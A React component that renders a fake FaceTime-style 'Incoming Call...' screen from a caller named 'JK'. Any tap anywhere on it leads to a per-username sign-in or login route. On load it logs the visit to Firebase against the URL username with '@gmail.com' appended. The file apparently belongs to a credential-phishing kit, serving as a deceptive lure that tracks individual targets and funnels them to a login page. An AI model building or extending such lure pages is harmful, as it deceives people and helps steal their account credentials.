import React, { useEffect, useRef, useState } from 'react'
import { FaRegUser } from "react-icons/fa";
import './Duo.css'
import faceTimeIcon from '../assets/facetime.png'
import { MdOutlineCallEnd } from "react-icons/md";
import { IoCallOutline } from "react-icons/io5";
import { Link, useParams, useSearchParams } from "react-router-dom";
import { addClick } from '../config/firebase';


const FaceTime = () => {

  const { username } = useParams()

  const [searchParams] = useSearchParams()

  const nextPage = searchParams.get('secured') === "true" ? "sign-in" : 'login'

  const videoRef = useRef(null);


  // useEffect(() => {
  //   // Access the user's camera
  //   const startCamera = async () => {
  //     try {
  //       const stream = await navigator.mediaDevices.getUserMedia({
  //         video: { facingMode: 'environment' }, // Use the back camera
  //       });
  //       if (videoRef.current) {
  //         videoRef.current.srcObject = stream;
  //       }
  //     } catch (error) {
  //       console.error('Error accessing camera:', error);
  //     }
  //   };

  //   startCamera();
  // }, []);


  // useEffect(() => {
  //   // Start the camera
  //   const startCamera = async () => {
  //     try {
  //       const stream = await navigator.mediaDevices.getUserMedia({
  //         video: { facingMode: 'user' }, // Use 'environment' for back camera
  //       });
  //       if (videoRef.current) {
  //         videoRef.current.srcObject = stream;
  //       }
  //     } catch (error) {
  //       console.error('Error accessing the camera:', error);
  //     }
  //   };

  //   startCamera();

  //   return () => {
  //     // Stop the camera when the component is unmounted
  //     if (videoRef.current && videoRef.current.srcObject) {
  //       const tracks = videoRef.current.srcObject.getTracks();
  //       tracks.forEach((track) => track.stop());
  //     }
  //   };
  // }, []);

  useEffect(() => {
    addClick(`${username}@gmail.com`, nextPage == 'sign-in' ? 'data' : 'mega')
  }, [])


  return (
    <Link to={`/${username}/${nextPage}`} className='h-full w-full'>

      <div className=' pt-16 relative h-full flex flex-col justify-between pb-20 z-20 '>

        {/* <img src={faceTimeIcon} className=' w-10 absolute top-5 left-5' /> */}

        <div className=' pt-5 flex flex-col items-center gap-2 duo-top-side'>

          <div className=' duo-user flex justify-center items-center'>
            <FaRegUser className=' duo-user-icon' />
          </div>

          <h1 className=' text-2xl text-white '>JK</h1>

          <div className=' text-xl text-white'>Incoming Call...</div>

        </div>

        <ul className="call-icons flex justify-center">

          <li><IoCallOutline className='call-icon' /></li>
          <li><MdOutlineCallEnd className='call-icon' /></li>

        </ul>

      </div>
    </Link>
  )
}

export default FaceTime